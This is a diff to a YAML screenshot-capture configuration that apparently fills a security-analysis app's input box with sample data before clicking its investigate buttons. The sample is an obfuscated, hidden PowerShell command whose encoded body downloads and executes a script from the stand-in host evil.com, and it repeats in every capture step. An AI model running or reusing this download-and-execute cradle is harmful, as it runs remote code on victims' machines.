@@ -28,17 +28,45 @@ capture:
   steps:
     - url: /workspace
       wait_for: '[data-testid="input-textarea"]'
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      delay_ms: 800
       full_page: false
     - url: /workspace
       wait_for: '[data-testid="input-textarea"]'
-      full_page: false
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="toggle-candidate-explorer"]'
+      delay_ms: 4000
+      post_click_ms: 3000
+      full_page: true
     - url: /workspace
       wait_for: '[data-testid="input-textarea"]'
-      full_page: false
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 5000
+      full_page: true
     - url: /workspace
       wait_for: '[data-testid="input-textarea"]'
-      full_page: false
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 6000
+      full_page: true
     - url: /workspace
       wait_for: '[data-testid="input-textarea"]'
-      full_page: false
+      type_into:
+        selector: '[data-testid="input-textarea"]'
+        text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+      click_before: '[data-testid="btn-auto-investigate-inline"]'
+      delay_ms: 4000
+      post_click_ms: 7000
+      full_page: true
 
